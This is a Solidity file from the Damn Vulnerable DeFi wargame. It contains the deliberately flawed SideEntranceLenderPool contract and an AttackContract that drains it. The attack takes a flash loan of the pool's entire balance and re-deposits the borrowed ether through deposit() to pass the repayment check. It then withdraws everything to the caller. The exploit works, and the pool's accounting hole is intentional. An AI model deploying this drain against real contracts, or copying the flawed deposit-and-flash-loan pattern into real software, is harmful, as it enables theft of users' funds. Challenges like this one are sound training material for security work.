// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
 
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract AttackContract {

    SideEntranceLenderPool public pool;

    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() public payable{
        pool.deposit{value: msg.value}();
    }

}